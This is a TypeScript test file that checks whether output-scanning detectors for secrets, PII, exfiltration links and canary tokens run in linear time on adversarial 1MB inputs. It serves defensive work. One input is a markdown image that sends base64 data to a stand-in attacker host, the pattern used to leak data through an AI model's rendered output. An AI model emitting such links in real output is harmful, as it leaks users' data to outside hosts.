import { describe, expect, it } from "vitest";
import {
  detectExfiltration,
  detectPII,
  detectSecrets,
  findCanary,
  redactFindings,
  scanOutputText,
} from "../output/index";

const MB = 2 ** 20;
const CANARY = "ZL-CANARY-7f3a9c2e41b0d6a8";
const ALL_PII = [
  "email",
  "phone",
  "credit_card",
  "us_ssn",
  "iban",
  "ip_address",
  "uk_nino",
  "us_passport",
] as const;

function fill(unit: string, size = MB): string {
  return unit.repeat(Math.ceil(size / unit.length)).slice(0, size);
}

let seed = 99;
function randomString(alphabet: string, length: number): string {
  const out: string[] = [];
  for (let i = 0; i < length; i++) {
    seed = (seed * 48_271) % 2_147_483_647;
    out.push(alphabet[seed % alphabet.length]);
  }
  return out.join("");
}

const B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/** Inputs shaped to trigger backtracking, quadratic rescans, or deep nesting. */
const ADVERSARIAL: Record<string, string> = {
  "a*": fill("a"),
  "![*": fill("!["),
  "sk-*": fill("sk-"),
  "sk-proj- + A*": `sk-proj-${fill("A")}`,
  "base64 run": randomString(B64, MB),
  "a@a.a@*": fill("a@a.a@"),
  "[](*": fill("[]("),
  "<a x*": fill("<a x"),
  "<img src=*": fill("<img src="),
  '<a href="…?d=*': fill('<a href="https://e.example/?d='),
  digits: fill("1"),
  "spaced digits": fill("1 "),
  "hyphenated digits": fill("1-"),
  "+1 *": fill("+1 "),
  "private key headers": fill("-----BEGIN PRIVATE KEY-----\n"),
  "jwt-ish": fill("eyJaaaaaaaaaa.eyJaaaaaaaaaa."),
  "password=*": fill("password="),
  "password:*": fill("password:"),
  'password="*': fill('password="'),
  "token: *": fill("token: "),
  "Authorization: Bearer *": fill("Authorization: Bearer "),
  "https://*": fill("https://"),
  "http://a:*": fill("http://a:"),
  "://@*": fill("://@"),
  backticks: fill("`"),
  fences: fill("```\n"),
  "%41*": fill("%41"),
  "url(*": fill("url("),
  "reference definitions": fill("\n[x]: "),
  "open quotes": fill('[a](b "'),
  hex: fill("0123456789abcdef"),
  "0x*": fill("0x5a, "),
  "a.*": fill("a."),
  "aws *": fill("aws "),
  "AKIA*": fill("AKIA"),
  "nested brackets": `${"[".repeat(MB / 2)}${"]".repeat(MB / 2)}`,
  "long line then newline": `${fill("x", MB - 1)}\n`,
};

/** Inputs that are almost entirely genuine findings: a throughput check, not a backtracking one. */
const MANY_FINDINGS: Record<string, string> = {
  "52k test cards": fill("4242 "),
  "61k markdown links": fill("[a](http://e.example/"),
  "mixed leaks": fill(
    '![x](https://evil.example/?d=aGVsbG8gd29ybGQ=) sk-proj-abc password="x" 415-555-1234 '
  ),
};

const DETECTORS: Record<string, (text: string) => unknown> = {
  detectSecrets: (t) => detectSecrets(t),
  detectPII: (t) => detectPII(t, { kinds: [...ALL_PII] }),
  detectExfiltration: (t) => detectExfiltration(t, { flagLinks: "all" }),
  findCanary: (t) => findCanary(t, CANARY),
};

/** scanOutputText runs all four detectors in sequence, so it gets their combined budget. */
const COMBINED: Record<string, (text: string) => unknown> = {
  scanOutputText: (t) => scanOutputText(t, { pii: true, canary: CANARY }),
};

/** Best of two runs, so a noisy machine does not fail a linear-time scan. */
function timeMs(fn: () => unknown): number {
  let best = Number.POSITIVE_INFINITY;
  for (let run = 0; run < 2; run++) {
    const start = performance.now();
    fn();
    best = Math.min(best, performance.now() - start);
  }
  return best;
}

function slowCases(
  inputs: Record<string, string>,
  budgetMs: number,
  detectors: Record<string, (text: string) => unknown> = DETECTORS
): string[] {
  for (const fn of Object.values(detectors)) {
    fn(
      "warm up https://a.example ![x](https://b.example) sk-test 415-555-1234 a@b.co"
    );
  }
  const slow: string[] = [];
  for (const [inputName, input] of Object.entries(inputs)) {
    for (const [detector, fn] of Object.entries(detectors)) {
      const ms = timeMs(() => fn(input));
      if (ms >= budgetMs) {
        slow.push(`${detector} on ${inputName}: ${ms.toFixed(0)}ms`);
      }
    }
  }
  return slow;
}

describe("adversarial inputs", () => {
  // Catastrophic backtracking on 1MB takes seconds to minutes; these budgets
  // are several times what an idle machine needs, so a loaded CI runner or
  // parallel test workers don't fail them, and a real regression still does.
  it("every detector finishes each 1MB adversarial input in under 1.5s", () => {
    expect(slowCases(ADVERSARIAL, 1500)).toEqual([]);
  }, 300_000);

  it("scanOutputText with every detector finishes each 1MB adversarial input in under 3s", () => {
    expect(slowCases(ADVERSARIAL, 3000, COMBINED)).toEqual([]);
  }, 300_000);

  it("stays linear when nearly every token is a finding", () => {
    expect(slowCases(MANY_FINDINGS, 3000)).toEqual([]);
    expect(slowCases(MANY_FINDINGS, 6000, COMBINED)).toEqual([]);
  }, 300_000);

  it("redacts many overlapping ranges in linear time", () => {
    const findings = Array.from({ length: 200_000 }, (_, i) => ({
      start: (i * 5) % MB,
      end: ((i * 5) % MB) + 7,
    }));
    const text = fill("abcdefgh");
    expect(timeMs(() => redactFindings(text, findings))).toBeLessThan(300);
  });
});
